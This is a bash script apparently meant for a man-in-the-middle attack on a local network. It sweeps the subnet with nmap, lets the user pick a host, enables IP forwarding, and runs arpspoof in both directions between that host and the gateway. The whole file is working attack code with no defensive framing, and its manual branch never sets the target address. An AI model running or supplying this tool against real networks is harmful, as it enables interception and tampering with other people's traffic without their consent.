#!/bin/bash

function hlp()
{
  echo "$0 -i [-A / -a]"
  echo "-i --- interface to search"
  echo "-A --- alias to do mitm with (Name of tech)"
  echo "OR"
  echo "-a --- automate GUI scan"
}

serv_ip=$(ifconfig | tr '\n' ';')
i=1;

interface="1";

while getopts i:a:A: flag
do
    case "${flag}" in
        i) interface=${OPTARG};;
        a) auto=${OPTARG};;
        A) target=${OPTARG};;
    esac
done

if [[ $interface == "1" ]]
then
  echo "should be interface"
  echo ""
  hlp
  exit
fi

if [[ $auto == "1" ]]
then
  while (true)
  do
    el=$(echo $serv_ip | cut -d ';' -f $i);

    if [[ $el == *"$interface"* ]];
    then
      i=$(($i+1))
      o=$(echo $serv_ip | cut -d ';' -f $i);
      your_ip=$(echo $o | cut -d " " -f 2);
      l=$(echo $your_ip | cut -d '.' -f 4);
      l=${#l}
      l=$((${#your_ip} - l - 1))
      serv_ip=${your_ip:0:l}
      serv_ip="$serv_ip.1"
      break;
    fi
    i=$(($i+1));
  done

  j=1;
  s="";
  q=$(nmap -sn $serv_ip-255 -oN scan.txt)
  
  list=$(echo $q | grep "scan")
  # list=($list)
  IFS=" " read -a l <<< $list;
  for (( i=1; i <= ${#l[@]}; i++ ))
  do
    el=$(echo $list | cut -d ' ' -f $i)
    if [[ $el ==  "for" ]]
    then
      if [[ $j == 1 ]]
      then
        j=$(($j+1))
        continue
      fi
      e=$(echo $list | cut -d ' ' -f $(($i + 1)));
      s+="$e;"
      echo "[$(($j - 1))] $e"
      echo ""
      j=$(($j+1))
    fi
  done
  
  
  echo "Quick report : "
  echo ""
  cat scan.txt
  echo ""
  rm scan.txt
  
  read -p "Choose target >> " target
  
  target=$(echo $s | cut -d ";" -f $target)
  
  hosts=$(echo $q | tr ' ' ';')
  
  i=1;
  
  while (true)
  do
    el=$(echo $hosts | cut -d ';' -f $i)
    if [[ $el == *"$target"* ]];
    then
      i=$(($i))
      ip=$(echo $hosts | cut -d ';' -f $i);
      ip=$(echo $ip | cut -d ' ' -f 5);
      i=$(($i + 8));
      MAC=$(echo $hosts | cut -d ';' -f $i);
      MAC=$(echo $MAC | cut -d ' ' -f 3)
      echo "$ip    $MAC"
      break;
    fi
  
    i=$(($i + 1))
  done
else
  while (true)
  do
    el=$(echo $serv_ip | cut -d ';' -f $i);

    if [[ $el == *"$interface"* ]];
    then
      i=$(($i+1))
      o=$(echo $serv_ip | cut -d ';' -f $i);
      your_ip=$(echo $o | cut -d " " -f 2);
      l=$(echo $your_ip | cut -d '.' -f 4);
      l=${#l}
      l=$((${#your_ip} - l - 1))
      serv_ip=${your_ip:0:l}
      serv_ip="$serv_ip.1"
      break;
    fi
    i=$(($i+1));
  done
fi

sysctl -w net.ipv4.ip_forward=1

echo "arpspoof -i $interface -t $ip $serv_ip"
arpspoof -i $interface -t $ip $serv_ip & arpspoof -i $interface -t $serv_ip $ip;

# target=$(grep $hosts $1);
# echo $target;
